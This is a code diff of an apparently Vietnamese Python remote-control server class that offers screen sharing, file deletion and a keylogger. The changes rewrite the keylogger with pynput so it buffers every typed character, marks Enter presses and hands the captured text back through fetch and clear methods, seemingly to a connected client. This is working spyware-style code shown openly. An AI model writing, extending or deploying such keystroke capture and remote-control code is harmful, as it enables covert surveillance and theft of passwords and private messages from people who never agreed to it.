@@ -4,20 +4,19 @@ import os
 import socket
 import subprocess
 import threading
+import time
+from pynput import keyboard
 from vidstream import ScreenShareClient
 from queue import Queue
-import pynput.keyboard
-
-import keyboard
 
 class SV_Model:
     def __init__(self, server_ip, server_port):
         self.server_ip = server_ip
         self.server_port = server_port
         self.server_socket = None
-        self.running = False
-        self.key_events = Queue()
-        self.is_logging = False
+        self.is_logging = False  # Trạng thái keylogger
+        self.keys_buffer = ""  # Buffer lưu các phím nhấn
+        self.listener = None
 
     def start_server(self):
         try:
@@ -163,8 +162,6 @@ class SV_Model:
             return "Screen sharing stopped."
         return "No screen sharing to stop."
     
-  
-    
     # Hàm kiểm tra sự tồn tại của file cấu hình
     def check_config_file(self, CONFIG_FILE):
         try:
@@ -219,66 +216,43 @@ class SV_Model:
             print("File cấu hình không tồn tại.")
             return None, None
 
-    #5. SV_Keylogger:   
+    #---------------5. SV_Keylogger: ------------------   
     def start_keylogging(self):
         """Bắt đầu ghi phím."""
-        self.is_logging = True
-        self.listener = pynput.keyboard.Listener(on_press=self._log_key)
-        self.listener.start()
+        if not self.is_logging:
+            self.is_logging = True
+            self.listener = keyboard.Listener(on_press=self.on_press)
+            self.listener.start()  # Bắt đầu lắng nghe
 
     def stop_keylogging(self):
-        """Dừng ghi phím."""
+        """Dừng keylogger."""
         if self.is_logging:
             self.is_logging = False
-            self.listener.stop()
+            self.listener.stop()  # Dừng lắng nghe
 
-    def _log_key(self, key):
-        """Hàm ghi phím."""
-        if self.is_logging:
-            try:
-                self.key_events.put(key.char)
-            except AttributeError:
-                self.key_events.put(f"[{key}]")
+    def on_press(self, key):
+        """Xử lý khi một phím được nhấn."""
+        try:
+            if hasattr(key, 'char') and key.char:
+                # Thêm phím nhấn vào buffer nếu là ký tự bình thường
+                self.keys_buffer += key.char
+            elif key == keyboard.Key.enter:
+                # Nếu phím Enter được nhấn, lưu buffer hiện tại và tạo dòng mới
+                self.keys_buffer += " [ENTER] "
+                self.process_buffer()  # Xử lý buffer hiện tại, ví dụ như in ra hoặc lưu vào nơi khác
+                self.keys_buffer = ""  # Reset buffer sau khi Enter
+        except AttributeError:
+            # Xử lý các phím đặc biệt khác nếu cần
+            pass
 
-    def fetch_keys(self):
-        """Trả về danh sách các phím đã ghi."""
-        keys = []
-        while not self.key_events.empty():
-            keys.append(self.key_events.get())
-        return keys
-     
-    # def start_keylogger():
-    #     keys_pressed = ""
-    #     MAX_LINE_LENGTH = 50
-    #     stop_keylogger = False
-    #     listener = None
+    def fetch_keylogger(self):
+        """Trả về các phím đã ghi lại từ bộ đệm."""
+        return self.keys_buffer
 
-    #     def on_press(key):
-    #         nonlocal keys_pressed, stop_keylogger
-    #         if stop_keylogger:
-    #             return False
+    def clear_keys(self):
+        """Xóa bộ đệm phím."""
+        self.keys_buffer = ""
 
-    #         if hasattr(key, 'char') and key.char is not None:
-    #             key_str = key.char
-    #         else:
-    #             key_str = f' {str(key)} '
-
-    #         if key == keyboard.Key.enter:
-    #             keys_pressed = ""
-    #         else:
-    #             keys_pressed += key_str
-
-    #         return key_str
-
-    #     listener = keyboard.Listener(on_press=on_press)
-    #     listener.start()
-
-    #     return listener
-    
-    # def stop_keylogger(listener):
-    #     listener.stop()
-    #     return "KEYLOGGER_STOPPED"
-   
     # ---------------- 6. Del_Delete File: ----------------------    
     def validate_file(self, file_path):
         if os.path.exists(file_path):
